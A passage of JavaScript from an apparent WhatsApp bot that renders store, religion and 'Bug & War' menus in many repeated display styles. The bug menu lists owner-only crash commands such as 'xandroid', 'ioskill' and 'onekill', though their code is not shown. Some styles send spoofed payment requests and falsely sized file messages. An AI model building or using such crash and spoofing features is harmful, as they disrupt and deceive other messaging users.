                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'storemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Store* 」❍
│${setv} ${prefix}list 🅕
│${setv} ${prefix}store 🅕
│${setv} ${prefix}shop 🅕
│${setv} ${prefix}addlist 🅞
│${setv} ${prefix}dellist 🅞
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'religionmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Religon* 」❍
│${setv} ${prefix}bible 🅕
│${setv} ${prefix}quran 🅕
│${setv} ${prefix}gita 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'bugmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Bug & War* 」❍
│${setv} ${prefix}xandroid 🅞
│${setv} ${prefix}xandroid2 🅞
│${setv} ${prefix}xios 🅞
│${setv} ${prefix}xios2 🅞
│${setv} ${prefix}systemuicrash 🅞
│${setv} ${prefix}xsysui 🅞
│${setv} ${prefix}🙂 🅞
│${setv} ${prefix}ioskill 🅞
│${setv} ${prefix}onekill 🅞
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
